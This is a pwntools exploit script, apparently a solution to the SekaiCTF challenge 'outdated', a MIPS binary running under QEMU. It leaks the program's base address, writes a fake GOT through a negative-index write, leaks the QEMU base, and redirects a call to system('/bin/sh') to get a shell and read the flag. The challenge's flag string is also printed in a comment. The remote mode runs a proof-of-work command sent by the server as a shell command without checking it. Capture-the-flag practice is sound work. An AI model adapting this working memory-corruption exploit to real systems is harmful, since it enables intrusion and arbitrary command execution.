from pwn import *
from subprocess import check_output
from subprocess import getoutput
import sys
import os

_path = "./outdated_patched"
build = "mipsel32r6-musl"
context.binary = exe = ELF(_path, checksec=False)
qemu = ELF("./ld-musl-mipsr6el-sf.so.1", checksec=False)
docker = ELF('/snap/bin/docker',checksec=False)
#libc = ELF("./libc.so.6", checksec=False)
#ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
addr = 'localhost'
port = 1337
cmd = f'''
    set architecture mips:isa32r6
    b *main+544
    # b *main+464
    b *main+560
    continue
'''

context.terminal = ['wt.exe', 'wsl', '-e', 'bash', '-c']

def get_pid(name):
    return int(check_output(["pgrep", "-f", "-n", name]))

def conn():
    if args.LOCAL:
        if args.GDB:
            p = gdb.debug(_path, gdbscript=cmd)
        else:
            p = process(['./qemu', 'ld-musl-mipsr6el-sf.so.1', 'outdated'])
    
    if args.DOCKER:
        if args.GDB:
            p = docker.process(['run','-i','--rm','-v','./:/target/ctf','-p','1234:1234',f'legoclones/mips-pwn:{build}','chroot','/target','/qemu','-g','1234','/ctf/outdated'])
            print("Remote debugging started...")
            gdb.attach(("127.0.0.1",1234), gdbscript=cmd, exe=_path)

    if args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]), ssl=True)

        p.recvuntil(b"proof of work: ")
        code = p.recvline().decode().strip()
        print(f"Solving POW: {code}")
        answer = getoutput(code)
        p.sendlineafter(b"solution: ", answer.encode())

    return p

chall = conn()

def sl(_data):
    chall.sendline(_data)

def sla(rgx, _data):
    chall.sendlineafter(rgx, _data)

def se(_data):
    chall.send(_data)

def sa(rgx, _data):
    chall.sendafter(rgx, _data)

def check():
    chall.interactive()
    exit()

def main():

    chall.recvuntil(b'Here')
    main_addr = int(chall.recvline().strip().split(b' ')[-1],16)
    exe.address = main_addr - 0x9d0
    print(f"leak main: {hex(exe.address)}")

    context.log_level = 'debug'
    fake_got = flat(
        p32(exe.address + 0x2004c - 0x118c), p32(0)*8, # __libc_main_address
        p32(exe.sym.main), p8(0)*36,
        p32(exe.sym.puts_blue), 
    )
    sla(b"game?\n", fake_got)
    sla(b"change?\n", str(-12))
    sla(b"level?\n", str(0x8090))
    chall.recvuntil(b"\x6d")
    chall.recvuntil(b"\x6d")
    leak = u32(chall.recv(3).ljust(4, b"\00"))
    qemu_base = leak - 0x25924
    system = qemu_base + 0x6d990
    binsh = qemu_base + 0xaaf20
    log.info(f"binsh: {hex(binsh)}")
    log.info(f"system: {hex(system)}")
    fake_got = flat(
        p32(binsh - 0x118c), p32(0)*8,
        p32(exe.sym.main), p8(0)*36,
        p32(system),
    )
    sla(b"game?\n", fake_got)
    sla(b"change?\n", str(-12))
    sla(b"level?\n", str(0x8090))
    sl(b"cat /ctf/flag.txt")

    check()


if __name__ == "__main__":
    main()

# SEKAI{!'Ve-dUbB3d-thIs_73(HN1QUE-"9P-*VERWR17E"}